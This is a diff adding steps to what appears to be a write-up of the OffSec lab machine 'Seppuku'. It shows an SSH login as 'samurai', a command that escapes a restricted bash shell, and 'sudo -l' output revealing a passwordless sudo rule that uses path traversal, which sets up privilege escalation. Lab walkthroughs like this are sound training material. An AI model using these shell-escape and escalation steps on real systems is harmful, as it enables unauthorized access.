@@ -479,3 +479,21 @@ SSH as Samurai
 ```
 > ssh samurai@192.168.241.90
 ```
+
+Resitriced Bash
+![image](https://github.com/karanshergill/OffSec-Play-Labs/assets/83878909/aeb450bc-3625-4fbd-84de-b30213cef871)
+
+Breaking out of Restricted Bash
+```
+> ssh samurai@192.168.241.90 -t "bash --noprofile"
+```
+
+Privilege Escalation
+```
+samurai@seppuku:~$ sudo -l
+Matching Defaults entries for samurai on seppuku:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User samurai may run the following commands on seppuku:
+    (ALL) NOPASSWD: /../../../../../../home/tanto/.cgi_bin/bin /tmp/*
+```
